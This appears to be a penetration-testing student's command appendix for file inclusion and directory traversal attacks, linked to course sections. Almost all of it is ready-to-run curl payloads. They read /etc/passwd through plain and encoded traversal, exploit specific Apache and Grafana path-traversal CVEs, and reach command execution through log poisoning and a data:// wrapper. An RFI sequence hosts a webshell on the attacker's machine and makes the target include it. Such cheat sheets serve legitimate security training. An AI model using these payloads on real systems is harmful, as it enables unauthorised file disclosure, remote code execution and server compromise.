# File Inclusion & Traversal — Command Appendix

Part of [[COMMAND APPENDIX]]. Directory traversal, LFI, RFI, and the PHP-wrapper variants.

---

## Directory Traversal / LFI / RFI Payloads

```bash
# Plain traversal
curl "http://<target>/index.php?page=../../../../../../../../../etc/passwd"

# URL-encoded dots, bypasses filters matching only the literal string
curl "http://<target>/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# Apache CVE-2021-41773/42013's specific asymmetric-first-segment pattern
curl --path-as-is "http://<target>/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# Grafana CVE-2021-43798 (core plugin path traversal, no auth needed)
curl --path-as-is "http://<target>:3000/public/plugins/alertlist/../../../../../../../../../../etc/passwd"

# LFI via log poisoning: poison a controllable field (e.g. User-Agent) with a PHP snippet in Burp first, then:
curl "http://<target>/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=<command>"

# LFI via php://filter, read PHP source instead of executing it
curl "http://<target>/index.php?page=php://filter/convert.base64-encode/resource=<file>.php"

# LFI via data:// wrapper, inline payload, no write step (needs allow_url_include)
curl "http://<target>/index.php?page=data://text/plain,<?php%20echo%20system('id');?>"

# RFI, host your own webshell and include it remotely (needs allow_url_include)
cd /usr/share/webshells/php/ && python3 -m http.server 80
curl "http://<target>/index.php?page=http://<your_ip>/simple-backdoor.php&cmd=id"
```
See [[Common Web Application Attacks#9.1.2. Identifying and Exploiting Directory Traversals|9.1.2]], [[Common Web Application Attacks#9.1.3. Encoding Special Characters|9.1.3]], [[Common Web Application Attacks#9.2.1. Local File Inclusion (LFI)|9.2.1]], [[Common Web Application Attacks#9.2.2. PHP Wrappers|9.2.2]], [[Common Web Application Attacks#9.2.3. Remote File Inclusion (RFI)|9.2.3]].

#### Tags: #DirectoryTraversal #LFI #RFI #PHPWrappers

---

## **Outstanding**
This area grows alongside the modules. Whenever a new traversal/inclusion variant comes up (Windows-specific LFI, Java/other-language equivalents, etc), add it here with a link back to the source section.
